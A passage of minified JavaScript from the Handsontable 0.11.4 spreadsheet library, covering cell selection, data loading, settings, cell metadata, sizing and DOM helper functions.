ta(h.row,h.col).readOnly){c.push([h.row,h.col,t[o][f]])}h.col++;if(r&&f===l-1){f=-1}}h.row++;if(r&&o===a-1){o=-1}}u.setDataAtCell(c,null,null,i||"populateFromArray");break}}};this.selection=s={inProgress:false,selectedHeader:{cols:false,rows:false},setSelectedHeaders:function(e,t){u.selection.selectedHeader.rows=e;u.selection.selectedHeader.cols=t},begin:function(){u.selection.inProgress=true},finish:function(){var e=u.getSelected();Handsontable.hooks.run(u,"afterSelectionEnd",e[0],e[1],e[2],e[3]);Handsontable.hooks.run(u,"afterSelectionEndByProp",e[0],u.colToProp(e[1]),e[2],u.colToProp(e[3]));u.selection.inProgress=false},isInProgress:function(){return u.selection.inProgress},setRangeStart:function(e){Handsontable.hooks.run(u,"beforeSetRangeStart",e);n.selRange=new WalkontableCellRange(e,e,e);s.setRangeEnd(e)},setRangeEnd:function(e,t){Handsontable.hooks.run(u,"beforeSetRangeEnd",e);u.selection.begin();n.selRange.to=new WalkontableCellCoords(e.row,e.col);if(!n.settings.multiSelect){n.selRange.from=e}u.view.wt.selections.current.clear();u.view.wt.selections.current.add(n.selRange.highlight);u.view.wt.selections.area.clear();if(s.isMultiple()){u.view.wt.selections.area.add(n.selRange.from);u.view.wt.selections.area.add(n.selRange.to)}if(n.settings.currentRowClassName||n.settings.currentColClassName){u.view.wt.selections.highlight.clear();u.view.wt.selections.highlight.add(n.selRange.from);u.view.wt.selections.highlight.add(n.selRange.to)}Handsontable.hooks.run(u,"afterSelection",n.selRange.from.row,n.selRange.from.col,n.selRange.to.row,n.selRange.to.col);Handsontable.hooks.run(u,"afterSelectionByProp",n.selRange.from.row,r.colToProp(n.selRange.from.col),n.selRange.to.row,r.colToProp(n.selRange.to.col));if(t!==false&&u.view.mainViewIsActive()){u.view.scrollViewport(e)}s.refreshBorders()},refreshBorders:function(e,t){if(!t){o.destroyEditor(e)}u.view.render();if(s.isSelected()&&!t){o.prepareEditor()}},isMultiple:function(){var e=!(n.selRange.to.col===n.selRange.from.col&&n.selRange.to.row===n.selRange.from.row),t=Handsontable.hooks.execute(u,"afterIsMultipleSelection",e);if(e){return t}},transformStart:function(e,t,r){var i=new WalkontableCellCoords(e,t);u.runHooks("modifyTransformStart",i);if(n.selRange.highlight.row+e>u.countRows()-1){if(r&&n.settings.minSpareRows>0){u.alter("insert_row",u.countRows())}else if(n.settings.autoWrapCol){i.row=1-u.countRows();i.col=n.selRange.highlight.col+i.col==u.countCols()-1?1-u.countCols():1}}else if(n.settings.autoWrapCol&&n.selRange.highlight.row+i.row<0&&n.selRange.highlight.col+i.col>=0){i.row=u.countRows()-1;i.col=n.selRange.highlight.col+i.col==0?u.countCols()-1:-1}if(n.selRange.highlight.col+i.col>u.countCols()-1){if(r&&n.settings.minSpareCols>0){u.alter("insert_col",u.countCols())}else if(n.settings.autoWrapRow){i.row=n.selRange.highlight.row+i.row==u.countRows()-1?1-u.countRows():1;i.col=1-u.countCols()}}else if(n.settings.autoWrapRow&&n.selRange.highlight.col+i.col<0&&n.selRange.highlight.row+i.row>=0){i.row=n.selRange.highlight.row+i.row==0?u.countRows()-1:-1;i.col=u.countCols()-1}var o=u.countRows();var a=u.countCols();var f=new WalkontableCellCoords(n.selRange.highlight.row+i.row,n.selRange.highlight.col+i.col);if(f.row<0){f.row=0}else if(f.row>0&&f.row>=o){f.row=o-1}if(f.col<0){f.col=0}else if(f.col>0&&f.col>=a){f.col=a-1}s.setRangeStart(f)},transformEnd:function(e,t){var r=new WalkontableCellCoords(e,t);u.runHooks("modifyTransformEnd",r);var i=u.countRows();var o=u.countCols();var a=new WalkontableCellCoords(n.selRange.to.row+r.row,n.selRange.to.col+r.col);if(a.row<0){a.row=0}else if(a.row>0&&a.row>=i){a.row=i-1}if(a.col<0){a.col=0}else if(a.col>0&&a.col>=o){a.col=o-1}s.setRangeEnd(a)},isSelected:function(){return n.selRange!==null},inInSelection:function(e){if(!s.isSelected()){return false}return n.selRange.includes(e)},deselect:function(){if(!s.isSelected()){return}u.selection.inProgress=false;n.selRange=null;u.view.wt.selections.current.clear();u.view.wt.selections.area.clear();if(n.settings.currentRowClassName||n.settings.currentColClassName){u.view.wt.selections.highlight.clear()}o.destroyEditor();s.refreshBorders();Handsontable.hooks.run(u,"afterDeselect")},selectAll:function(){if(!n.settings.multiSelect){return}s.setRangeStart(new WalkontableCellCoords(0,0));s.setRangeEnd(new WalkontableCellCoords(u.countRows()-1,u.countCols()-1),false)},empty:function(){if(!s.isSelected()){return}var e=n.selRange.getTopLeftCorner();var t=n.selRange.getBottomRightCorner();var r,i,o=[];for(r=e.row;r<=t.row;r++){for(i=e.col;i<=t.col;i++){if(!u.getCellMeta(r,i).readOnly){o.push([r,i,""])}}}u.setDataAtCell(o)}};this.init=function(){Handsontable.hooks.run(u,"beforeInit");this.updateSettings(n.settings,true);this.view=new Handsontable.TableView(this);o=new Handsontable.EditorManager(u,n,s,r);this.forceFullRender=true;this.view.render();if(typeof n.firstRun==="object"){Handsontable.hooks.run(u,"afterChange",n.firstRun[0],n.firstRun[1]);n.firstRun=false}Handsontable.hooks.run(u,"afterInit")};this.validateCell=function(e,t,n,r){var i=u.getCellValidator(t);if(Object.prototype.toString.call(i)==="[object RegExp]"){i=function(e){return function(t,n){n(e.test(t))}}(i)}if(typeof i=="function"){e=Handsontable.hooks.execute(u,"beforeValidate",e,t.row,t.prop,r);u._registerTimeout(setTimeout(function(){i.call(t,e,function(i){t.valid=i;i=Handsontable.hooks.execute(u,"afterValidate",i,e,t.row,t.prop,r);n(i)});return e},0))}else{t.valid=true;n(true)}};this.setDataAtCell=function(e,t,n,i){var s=d(e,t,n),o,u,a=[],f;for(o=0,u=s.length;o<u;o++){if(typeof s[o]!=="object"){throw new Error("Method `setDataAtCell` accepts row number or changes array of arrays as its first parameter")}if(typeof s[o][1]!=="number"){throw new Error("Method `setDataAtCell` accepts row and column number as its parameters. If you want to use object property name, use method `setDataAtRowProp`")}f=r.colToProp(s[o][1]);a.push([s[o][0],f,r.get(s[o][0],f),s[o][2]])}if(!i&&typeof e==="object"){i=t}h(a,i,function(){p(a,i)})};this.setDataAtRowProp=function(e,t,n,i){var s=d(e,t,n),o,u,a=[];for(o=0,u=s.length;o<u;o++){a.push([s[o][0],s[o][1],r.get(s[o][0],s[o][1]),s[o][2]])}if(!i&&typeof e==="object"){i=t}h(a,i,function(){p(a,i)})};this.listen=function(){Handsontable.activeGuid=u.guid;if(document.activeElement&&document.activeElement!==document.body){document.activeElement.blur()}else if(!document.activeElement){document.body.focus()}};this.unlisten=function(){Handsontable.activeGuid=null};this.isListening=function(){return Handsontable.activeGuid===u.guid};this.destroyEditor=function(e){s.refreshBorders(e)};this.populateFromArray=function(e,t,n,r,s,o,u){if(!(typeof n==="object"&&typeof n[0]==="object")){throw new Error("populateFromArray parameter `input` must be an array of arrays")}return i.populateFromArray(new WalkontableCellCoords(e,t),n,typeof r==="number"?new WalkontableCellCoords(r,s):null,o,u)};this.spliceCol=function(e,t,n){return r.spliceCol.apply(r,arguments)};this.spliceRow=function(e,t,n){return r.spliceRow.apply(r,arguments)};this.getSelected=function(){if(s.isSelected()){return[n.selRange.from.row,n.selRange.from.col,n.selRange.to.row,n.selRange.to.col]}};this.getSelectedRange=function(){if(s.isSelected()){return n.selRange}};this.render=function(){if(u.view){u.forceFullRender=true;s.refreshBorders(null,true)}};this.loadData=function(e){function c(){n.cellSettings.length=0}if(typeof e==="object"&&e!==null){if(!(e.push&&e.splice)){e=[e]}}else if(e===null){e=[];var t;for(var s=0,o=n.settings.startRows;s<o;s++){t=[];for(var f=0,l=n.settings.startCols;f<l;f++){t.push(null)}e.push(t)}}else{throw new Error("loadData only accepts array of objects or array of arrays ("+typeof e+" given)")}n.isPopulated=false;a.prototype.data=e;if(n.settings.dataSchema instanceof Array||e[0]instanceof Array){u.dataType="array"}else if(typeof n.settings.dataSchema==="function"){u.dataType="function"}else{u.dataType="object"}r=new Handsontable.DataMap(u,n,a);c();i.adjustRowsAndCols();Handsontable.hooks.run(u,"afterLoadData");if(n.firstRun){n.firstRun=[null,"loadData"]}else{Handsontable.hooks.run(u,"afterChange",null,"loadData");u.render()}n.isPopulated=true};this.getData=function(e,t,n,i){if(typeof e==="undefined"){return r.getAll()}else{return r.getRange(new WalkontableCellCoords(e,t),new WalkontableCellCoords(n,i),r.DESTINATION_RENDERER)}};this.getCopyableData=function(e,t,n,i){return r.getCopyableText(new WalkontableCellCoords(e,t),new WalkontableCellCoords(n,i))};this.updateSettings=function(e,t){var o,f;if(typeof e.rows!=="undefined"){throw new Error("'rows' setting is no longer supported. do you mean startRows, minRows or maxRows?")}if(typeof e.cols!=="undefined"){throw new Error("'cols' setting is no longer supported. do you mean startCols, minCols or maxCols?")}for(o in e){if(o==="data"){continue}else{if(Handsontable.hooks.hooks[o]!==void 0||Handsontable.hooks.legacy[o]!==void 0){if(typeof e[o]==="function"||Handsontable.helper.isArray(e[o])){u.addHook(o,e[o])}}else{if(!t&&e.hasOwnProperty(o)){a.prototype[o]=e[o]}}}}if(e.data===void 0&&n.settings.data===void 0){u.loadData(null)}else if(e.data!==void 0){u.loadData(e.data)}else if(e.columns!==void 0){r.createMap()}f=u.countCols();n.cellSettings.length=0;if(f>0){var l,c;for(o=0;o<f;o++){n.columnSettings[o]=Handsontable.helper.columnFactory(a,n.columnsSettingConflicts);l=n.columnSettings[o].prototype;if(a.prototype.columns){c=a.prototype.columns[o];Handsontable.helper.extend(l,c);Handsontable.helper.extend(l,v(c))}}}if(typeof e.cell!=="undefined"){for(o in e.cell){var h=e.cell[o];u.setCellMetaObject(h.row,h.col,h)}}Handsontable.hooks.run(u,"afterCellMetaReset");if(typeof e.className!=="undefined"){if(a.prototype.className){u.rootElement.removeClass(a.prototype.className)}if(e.className){u.rootElement.addClass(e.className)}}if(typeof e.height!="undefined"){var p=e.height;if(typeof p=="function"){p=p()}u.rootElement[0].style.height=p+"px"}if(typeof e.width!="undefined"){var d=e.width;if(typeof d=="function"){d=d()}u.rootElement[0].style.width=d+"px"}if(p){u.rootElement[0].style.overflow="auto"}if(!t){Handsontable.hooks.run(u,"afterUpdateSettings")}i.adjustRowsAndCols();if(u.view&&!n.firstRun){u.forceFullRender=true;s.refreshBorders(null,true)}};this.getValue=function(){var e=u.getSelected();if(a.prototype.getValue){if(typeof a.prototype.getValue==="function"){return a.prototype.getValue.call(u)}else if(e){return u.getData()[e[0]][a.prototype.getValue]}}else if(e){return u.getDataAtCell(e[0],e[1])}};this.getSettings=function(){return n.settings};this.clear=function(){s.selectAll();s.empty()};this.alter=function(e,t,n,r,s){i.alter(e,t,n,r,s)};this.getCell=function(e,t){return u.view.getCellAtCoords(new WalkontableCellCoords(e,t))};this.colToProp=function(e){return r.colToProp(e)};this.propToCol=function(e){return r.propToCol(e)};this.getDataAtCell=function(e,t){return r.get(e,r.colToProp(t))};this.getDataAtRowProp=function(e,t){return r.get(e,t)};this.getDataAtCol=function(e){var t=[];return t.concat.apply(t,r.getRange(new WalkontableCellCoords(0,e),new WalkontableCellCoords(n.settings.data.length-1,e),r.DESTINATION_RENDERER))};this.getDataAtProp=function(e){var t=[];return t.concat.apply(t,r.getRange(new WalkontableCellCoords(0,r.propToCol(e)),new WalkontableCellCoords(n.settings.data.length-1,r.propToCol(e)),r.DESTINATION_RENDERER))};this.getSourceDataAtCol=function(e){var t=[],r=n.settings.data;for(var i=0;i<r.length;i++){t.push(r[i][e])}return t};this.getSourceDataAtRow=function(e){return n.settings.data[e]};this.getDataAtRow=function(e){var t=r.getRange(new WalkontableCellCoords(e,0),new WalkontableCellCoords(e,this.countCols()-1),r.DESTINATION_RENDERER);return t[0]};this.removeCellMeta=function(e,t,r){var i=u.getCellMeta(e,t);if(i[r]!=undefined){delete n.cellSettings[e][t][r]}};this.setCellMetaObject=function(e,t,n){if(typeof n==="object"){for(var r in n){var i=r,s=n[r];this.setCellMeta(e,t,i,s)}}};this.setCellMeta=function(e,t,r,i){if(!n.cellSettings[e]){n.cellSettings[e]=[]}if(!n.cellSettings[e][t]){n.cellSettings[e][t]=new n.columnSettings[t]}n.cellSettings[e][t][r]=i;Handsontable.hooks.run(u,"afterSetCellMeta",e,t,r,i)};this.getCellMeta=function(e,t){var i=r.colToProp(t),s;e=m(e);t=g(t);if(!n.columnSettings[t]){n.columnSettings[t]=Handsontable.helper.columnFactory(a,n.columnsSettingConflicts)}if(!n.cellSettings[e]){n.cellSettings[e]=[]}if(!n.cellSettings[e][t]){n.cellSettings[e][t]=new n.columnSettings[t]}s=n.cellSettings[e][t];s.row=e;s.col=t;s.prop=i;s.instance=u;Handsontable.hooks.run(u,"beforeGetCellMeta",e,t,s);Handsontable.helper.extend(s,v(s));if(s.cells){var o=s.cells.call(s,e,t,i);if(o){Handsontable.helper.extend(s,o);Handsontable.helper.extend(s,v(o))}}Handsontable.hooks.run(u,"afterGetCellMeta",e,t,s);return s};var y=Handsontable.helper.cellMethodLookupFactory("renderer");this.getCellRenderer=function(e,t){var n=y.call(this,e,t);return Handsontable.renderers.getRenderer(n)};this.getCellEditor=Handsontable.helper.cellMethodLookupFactory("editor");this.getCellValidator=Handsontable.helper.cellMethodLookupFactory("validator");this.validateCells=function(e){var t=new c;t.onQueueEmpty=e;var n=u.countRows()-1;while(n>=0){var r=u.countCols()-1;while(r>=0){t.addValidatorToQueue();u.validateCell(u.getDataAtCell(n,r),u.getCellMeta(n,r),function(){t.removeValidatorFormQueue()},"validateCells");r--}n--}t.checkIfQueueIsEmpty()};this.getRowHeader=function(e){if(e===void 0){var t=[];for(var r=0,i=u.countRows();r<i;r++){t.push(u.getRowHeader(r))}return t}else if(Object.prototype.toString.call(n.settings.rowHeaders)==="[object Array]"&&n.settings.rowHeaders[e]!==void 0){return n.settings.rowHeaders[e]}else if(typeof n.settings.rowHeaders==="function"){return n.settings.rowHeaders(e)}else if(n.settings.rowHeaders&&typeof n.settings.rowHeaders!=="string"&&typeof n.settings.rowHeaders!=="number"){return e+1}else{return n.settings.rowHeaders}};this.hasRowHeaders=function(){return!!n.settings.rowHeaders};this.hasColHeaders=function(){if(n.settings.colHeaders!==void 0&&n.settings.colHeaders!==null){return!!n.settings.colHeaders}for(var e=0,t=u.countCols();e<t;e++){if(u.getColHeader(e)){return true}}return false};this.getColHeader=function(e){if(e===void 0){var t=[];for(var r=0,i=u.countCols();r<i;r++){t.push(u.getColHeader(r))}return t}else{var s=e;e=Handsontable.hooks.execute(u,"modifyCol",e);if(n.settings.columns&&n.settings.columns[e]&&n.settings.columns[e].title){return n.settings.columns[e].title}else if(Object.prototype.toString.call(n.settings.colHeaders)==="[object Array]"&&n.settings.colHeaders[e]!==void 0){return n.settings.colHeaders[e]}else if(typeof n.settings.colHeaders==="function"){return n.settings.colHeaders(e)}else if(n.settings.colHeaders&&typeof n.settings.colHeaders!=="string"&&typeof n.settings.colHeaders!=="number"){return Handsontable.helper.spreadsheetColumnLabel(s)}else{return n.settings.colHeaders}}};this._getColWidthFromSettings=function(e){var t=u.getCellMeta(0,e);var r=t.width;if(r===void 0||r===n.settings.width){r=t.colWidths}if(r!==void 0&&r!==null){switch(typeof r){case"object":r=r[e];break;case"function":r=r(e);break}if(typeof r==="string"){r=parseInt(r,10)}}return r};this.getColWidth=function(e){var t=u._getColWidthFromSettings(e);if(!t){t=50}t=Handsontable.hooks.execute(u,"modifyColWidth",t,e);return t};this._getRowHeightFromSettings=function(e){var t=n.settings.rowHeights;if(t!==void 0&&t!==null){switch(typeof t){case"object":t=t[e];break;case"function":t=t(e);break}if(typeof t==="string"){t=parseInt(t,10)}}return t};this.getRowHeight=function(e){var t=u._getRowHeightFromSettings(e),n=u.checkIfRowIsOversized(e);t=Handsontable.hooks.execute(u,"modifyRowHeight",t,e);if(n){t=t?Math.max(t,n):n}return t};this.checkIfRowIsOversized=function(e){if(u.view.wt.wtTable.oversizedRows){return u.view.wt.wtTable.oversizedRows[e]}};this.countRows=function(){return n.settings.data.length};this.countCols=function(){if(u.dataType==="object"||u.dataType==="function"){if(n.settings.columns&&n.settings.columns.length){return n.settings.columns.length}else{return r.colToPropCache.length}}else if(u.dataType==="array"){if(n.settings.columns&&n.settings.columns.length){return n.settings.columns.length}else if(n.settings.data&&n.settings.data[0]&&n.settings.data[0].length){return n.settings.data[0].length}else{return 0}}};this.rowOffset=function(){return u.view.wt.getSetting("offsetRow")};this.colOffset=function(){return 0};this.countVisibleRows=function(){return u.view.wt.drawn?u.view.wt.wtTable.rowStrategy.countVisible():-1};this.countVisibleCols=function(){return u.view.wt.drawn?u.view.wt.wtTable.columnStrategy.countVisible():-1};this.countEmptyRows=function(e){var t=u.countRows()-1,n=0,r;while(t>=0){r=Handsontable.hooks.execute(this,"modifyRow",t);if(u.isEmptyRow(r)){n++}else if(e){break}t--}return n};this.countEmptyCols=function(e){if(u.countRows()<1){return 0}var t=u.countCols()-1,n=0;while(t>=0){if(u.isEmptyCol(t)){n++}else if(e){break}t--}return n};this.isEmptyRow=function(e){return n.settings.isEmptyRow.call(u,e)};this.isEmptyCol=function(e){return n.settings.isEmptyCol.call(u,e)};this.selectCell=function(e,t,r,i,o){if(typeof e!=="number"||e<0||e>=u.countRows()){return false}if(typeof t!=="number"||t<0||t>=u.countCols()){return false}if(typeof r!=="undefined"){if(typeof r!=="number"||r<0||r>=u.countRows()){return false}if(typeof i!=="number"||i<0||i>=u.countCols()){return false}}var a=new WalkontableCellCoords(e,t);n.selRange=new WalkontableCellRange(a,a,a);if(document.activeElement&&document.activeElement!==document.documentElement&&document.activeElement!==document.body){document.activeElement.blur()}u.listen();if(typeof r==="undefined"){s.setRangeEnd(n.selRange.from,o)}else{s.setRangeEnd(new WalkontableCellCoords(r,i),o)}u.selection.finish();return true};this.selectCellByProp=function(e,t,n,i,s){arguments[1]=r.propToCol(arguments[1]);if(typeof arguments[3]!=="undefined"){arguments[3]=r.propToCol(arguments[3])}return u.selectCell.apply(u,arguments)};this.deselectCell=function(){s.deselect()};this.destroy=function(){u._clearTimeouts();if(u.view){u.view.wt.destroy()}u.rootElement.empty();u.rootElement.removeData("handsontable");u.rootElement.off(".handsontable");$(window).off("."+u.guid);f.off("."+u.guid);l.off("."+u.guid);Handsontable.hooks.run(u,"afterDestroy");Handsontable.hooks.destroy(u);for(var e in u){if(u.hasOwnProperty(e)){if(typeof u[e]==="function"){if(e!=="runHooks"&&e!=="runHooksAndReturn"){u[e]=b}}else if(e!=="guid"){u[e]=null}}}n=null;r=null;i=null;s=null;o=null;u=null;a=null;f=null;l=null};this.getActiveEditor=function(){return o.getActiveEditor()};this.getInstance=function(){return u};this.addHook=function(e,t){Handsontable.hooks.add(e,t,u)};this.addHookOnce=function(e,t){Handsontable.hooks.once(e,t,u)};this.removeHook=function(e,t){Handsontable.hooks.remove(e,t,u)};this.runHooks=function(e,t,n,r,i,s,o){Handsontable.hooks.run(u,e,t,n,r,i,s,o)};this.runHooksAndReturn=function(e,t,n,r,i,s,o){return Handsontable.hooks.execute(u,e,t,n,r,i,s,o)};this.timeouts=[];this._registerTimeout=function(e){this.timeouts.push(e)};this._clearTimeouts=function(){for(var e=0,t=this.timeouts.length;e<t;e++){clearTimeout(this.timeouts[e])}};this.version="0.11.4"};var DefaultSettings=function(){};DefaultSettings.prototype={data:void 0,dataSchema:void 0,width:void 0,height:void 0,startRows:5,startCols:5,rowHeaders:null,colHeaders:null,colWidths:void 0,columns:void 0,cells:void 0,cell:[],minRows:0,minCols:0,maxRows:Infinity,maxCols:Infinity,minSpareRows:0,minSpareCols:0,multiSelect:true,fillHandle:true,fixedRowsTop:0,fixedColumnsLeft:0,outsideClickDeselects:true,enterBeginsEditing:true,enterMoves:{row:1,col:0},tabMoves:{row:0,col:1},autoWrapRow:false,autoWrapCol:false,copyRowsLimit:1e3,copyColsLimit:1e3,pasteMode:"overwrite",currentRowClassName:void 0,currentColClassName:void 0,stretchH:"none",isEmptyRow:function(e){var t;for(var n=0,r=this.countCols();n<r;n++){t=this.getDataAtCell(e,n);if(t!==""&&t!==null&&typeof t!=="undefined"){return false}}return true},isEmptyCol:function(e){var t;for(var n=0,r=this.countRows();n<r;n++){t=this.getDataAtCell(n,e);if(t!==""&&t!==null&&typeof t!=="undefined"){return false}}return true},observeDOMVisibility:true,allowInvalid:true,invalidCellClassName:"htInvalid",placeholder:false,placeholderCellClassName:"htPlaceholder",readOnlyCellClassName:"htDimmed",commentedCellClassName:"htCommentCell",fragmentSelection:false,readOnly:false,type:"text",copyable:true,debug:false,wordWrap:true,noWordWrapClassName:"htNoWrap",contextMenu:void 0,undo:void 0,columnSorting:void 0,manualColumnMove:void 0,manualColumnResize:void 0,manualRowMove:void 0,manualRowResize:void 0,groups:void 0};Handsontable.DefaultSettings=DefaultSettings;$.fn.handsontable=function(e){var t,n,r,i,s,o=this.first(),u=o.data("handsontable");if(typeof e!=="string"){s=e||{};if(u){u.updateSettings(s)}else{u=new Handsontable.Core(o,s);o.data("handsontable",u);u.init()}return o}else{r=[];if(arguments.length>1){for(t=1,n=arguments.length;t<n;t++){r.push(arguments[t])}}if(u){if(typeof u[e]!=="undefined"){i=u[e].apply(u,r)}else{throw new Error("Handsontable do not provide action: "+e)}}return i}};(function(e){"use strict";function t(){function t(e){return e!==null&&!r(e)&&(typeof e=="string"||typeof e=="number")}function n(e){return e!==null&&(typeof e=="object"||typeof e=="function")}function r(e){return e!==e}var e={arrayMap:[],weakMap:new WeakMap};return{get:function(r){if(t(r)){return e.arrayMap[r]}else if(n(r)){return e.weakMap.get(r)}},set:function(r,i){if(t(r)){e.arrayMap[r]=i}else if(n(r)){e.weakMap.set(r,i)}else{throw new Error("Invalid key type")}},"delete":function(r){if(t(r)){delete e.arrayMap[r]}else if(n(r)){e.weakMap["delete"](r)}}}}if(!e.MultiMap){e.MultiMap=t}})(window);if(!window.Handsontable){var Handsontable={}}Handsontable.Dom={};Handsontable.Dom.closest=function(e,t,n){while(e!=null&&e!==n){if(e.nodeType===1&&t.indexOf(e.nodeName)>-1){return e}e=e.parentNode}return null};Handsontable.Dom.isChildOf=function(e,t){var n=e.parentNode;while(n!=null){if(n==t){return true}n=n.parentNode}return false};Handsontable.Dom.index=function(e){var t=0;while(e=e.previousSibling){++t}return t};if(document.documentElement.classList){Handsontable.Dom.hasClass=function(e,t){return e.classList.contains(t)};Handsontable.Dom.addClass=function(e,t){e.classList.add(t)};Handsontable.Dom.removeClass=function(e,t){e.classList.remove(t)}}else{Handsontable.Dom.hasClass=function(e,t){return e.className.match(new RegExp("(\\s|^)"+t+"(\\s|$)"))};Handsontable.Dom.addClass=function(e,t){if(e.className=="")e.className=t;else if(!this.hasClass(e,t))e.className+=" "+t};Handsontable.Dom.removeClass=function(e,t){if(this.hasClass(e,t)){var n=new RegExp("(\\s|^)"+t+"(\\s|$)");e.className=e.className.replace(n," ").trim()}}}Handsontable.Dom.removeTextNodes=function(e,t){if(e.nodeType===3){t.removeChild(e)}else if(["TABLE","THEAD","TBODY","TFOOT","TR"].indexOf(e.nodeName)>-1){var n=e.childNodes;for(var r=n.length-1;r>=0;r--){this.removeTextNodes(n[r],e)}}};Handsontable.Dom.empty=function(e){var t;while(t=e.lastChild){e.removeChild(t)}};Handsontable.Dom.HTML_CHARACTERS=/(<(.*)>|&(.*);)/;Handsontable.Dom.fastInnerHTML=function(e,t){if(this.HTML_CHARACTERS.test(t)){e.innerHTML=t}else{this.fastInnerText(e,t)}};if(document.createTextNode("test").textContent){Handsontable.Dom.fastInnerText=function(e,t){var n=e.firstChild;if(n&&n.nodeType===3&&n.nextSibling===null){n.textContent=t}else{this.empty(e);e.appendChild(document.createTextNode(t))}}}else{Handsontable.Dom.fastInnerText=function(e,t){var n=e.firstChild;if(n&&n.nodeType===3&&n.nextSibling===null){n.data=t}else{this.empty(e);e.appendChild(document.createTextNode(t))}}}Handsontable.Dom.isVisible=function(e){var t=e;while(t!==document.documentElement){if(t===null){return false}else if(t.nodeType===11){if(t.host){if(t.host.impl){return Handsontable.Dom.isVisible(t.host.impl)}else if(t.host){return Handsontable.Dom.isVisible(t.host)}else{throw new Error("Lost in Web Components world")}}else{return false}}else if(t.style.display==="none"){return false}t=t.parentNode}return true};Handsontable.Dom.offset=function(e){if(this.hasCaptionProblem()&&e.firstChild&&e.firstChild.nodeName==="CAPTION"){var t=e.getBoundingClientRect();return{top:t.top+(window.pageYOffset||document.documentElement.scrollTop)-(document.documentElement.clientTop||0),left:t.left+(window.pageXOffset||document.documentElement.scrollLeft)-(document.documentElement.clientLeft||0)}}var n=e.offsetLeft,r=e.offsetTop,i=e;while(e=e.offsetParent){if(e===document.body){break}n+=e.offsetLeft;r+=e.offsetTop;i=e}if(i&&i.style.position==="fixed"){n+=window.pageXOffset||document.documentElement.scrollLeft;r+=window.pageYOffset||document.documentElement.scrollTop}return{left:n,top:r}};Handsontable.Dom.getWindowScrollTop=function(){var e=window.scrollY;if(e==void 0){e=document.documentElement.scrollTop}return e};Handsontable.Dom.getWindowScrollLeft=function(){var e=window.scrollX;if(e==void 0){e=document.documentElement.scrollLeft}return e};Handsontable.Dom.getScrollTop=function(e){if(e===window){return Handsontable.Dom.getWindowScrollTop(e)}else{return e.scrollTop}};Handsontable.Dom.getScrollLeft=function(e){if(e===window){return Handsontable.Dom.getWindowScrollLeft(e)}else{return e.scrollLeft}};Handsontable.Dom.getComputedStyle=function(e){return e.currentStyle||document.defaultView.getComputedStyle(e)};Handsontable.Dom.outerWidth=function(e){return e.offsetWidth};Handsontable.Dom.outerHeight=function(e){if(this.hasCaptionProblem()&&e.firstChild&&e.firstChild.nodeName==="CAPTION"){return e.offsetHeight+e.firstChild.offsetHeight}else{return e.offsetHeight}};Handsontable.Dom.innerHeight=function(e){return e.clientHeight};Handsontable.Dom.innerWidth=function(e){return e.innerWidth};(function(){function t(){var t=document.createElement("TABLE");t.style.borderSpacing=0;t.style.borderWidth=0;t.style.padding=0;var n=document.createElement("TBODY");t.appendChild(n);n.appendChild(document.createElement("TR"));n.firstChild.appendChild(document.createElement("TD"));n.firstChild.firstChild.innerHTML="<tr><td>t<br>t</td></tr>";var r=document.createElement("CAPTION");r.innerHTML="c<br>c<br>c<br>c";r.style.padding=0;r.style.margin=0;t.insertBefore(r,n);document.body.appendChild(t);e=t.offsetHeight<2*t.lastChild.offsetHeight;document.body.removeChild(t)}function r(){var e=document.createElement("p");e.style.width="100%";e.style.height="200px";var t=document.createElement("div");t.style.position="absolute";t.style.top="0px";t.style.left="0px";t.style.visibility="hidden";t.style.width="200px";t.style.height="150px";t.style.overflow="hidden";t.appendChild(e);(document.body||document.documentElement).appendChild(t);var n=e.offsetWidth;t.style.overflow="scroll";var r=e.offsetWidth;if(n==r)r=t.clientWidth;(document.body||document.documentElement).removeChild(t);return n-r}var e;Handsontable.Dom.hasCaptionProblem=function(){if(e===void 0){t()}return e};Handsontable.Dom.getCaretPosition=function(e){if(e.selectionStart){return e.selectionStart}else if(document.selection){e.focus();var t=document.selection.createRange();if(t==null){return 0}var n=e.createTextRange(),r=n.duplicate();n.moveToBookmark(t.getBookmark());r.setEndPoint("EndToStart",n);return r.text.length}return 0};Handsontable.Dom.getSelectionEndPosition=function(e){if(e.selectionEnd){return e.selectionEnd}else if(document.selection){var t=document.selection.createRange();if(t==null){return 0}var n=e.createTextRange();return n.text.indexOf(t.text)+t.text.length}};Handsontable.Dom.setCaretPosition=function(e,t,n){if(n===void 0){n=t}if(e.setSelectionRange){e.focus();e.setSelectionRange(t,n)}else if(e.createTextRange){var r=e.createTextRange();r.collapse(true);r.moveEnd("character",n);r.moveStart("character",t);r.select()}};var n;Handsontable.Dom.getScrollbarWidth=function(){if(n===void 0){n=r()}return n}})();Handsontable.TableView=function(e){var t=this,n=$(document.documentElement);this.instance=e;this.settings=e.getSettings();e.rootElement.data("originalStyle",e.rootElement[0].getAttribute("style"));e.rootElement.addClass("handsontable");var r=document.createElement("TABLE");r.className="htCore";this.THEAD=document.createElement("THEAD");r.appendChild(this.THEAD);this.TBODY=document.createElement("TBODY");this.TBODY.className="notranslate";r.appendChild(this.TBODY);e.$table=$(r);e.container.prepend(e.$table);e.rootElement.on("mousedown.handsontable",function(e){if(!t.isTextSelectionAllowed(e.target)){s();e.preventDefault();window.focus()}});n.on("keyup."+e.guid,function(t){if(e.selection.isInProgress()&&!t.shiftKey){e.selection.finish()}});var i;this.isMouseDown=function(){return i};n.on("mouseup."+e.guid,function(t){if(e.selection.isInProgress()&&t.which===1){e.selection.finish()}i=false;if(Handsontable.helper.isOutsideInput(document.activeElement)){e.unlisten()}});n.on("mousedown."+e.guid,function(n){var r=n.target;if(i){return}if(r!==t.wt.wtTable.spreader){while(r!==document.documentElement){if(r===null){return}if(r===e.rootElement[0]){return}r=r.parentNode}}if(t.settings.outsideClickDeselects){e.deselectCell()}else{e.destroyEditor()}});e.$table.on("selectstart",function(e){if(t.settings.fragmentSelection){return}e.preventDefault()});var s=function(){if(window.getSelection){if(window.getSelection().empty){window.getSelection().empty()}else if(window.getSelection().removeAllRanges){window.getSelection().removeAllRanges()}}else if(document.selection){document.selection.empty()}};var o=[new WalkontableSelection({className:"current",border:{width:2,color:"#5292F7",cornerVisible:function(){return t.settings.fillHandle&&!t.isCellEdited()&&!e.selection.isMultiple()}}}),new WalkontableSelection({className:"area",border:{width:1,color:"#89AFF9",cornerVisible:function(){return t.settings.fillHandle&&!t.isCellEdited()&&e.selection.isMultiple()}}}),new WalkontableSelection({className:"highlight",highlightRowClassName:t.settings.currentRowClassName,highlightColumnClassName:t.settings.currentColClassName}),new WalkontableSelection({className:"fill",border:{width:1,color:"red"}})];o.current=o[0];o.area=o[1];o.highlight=o[2];o.fill=o[3];var 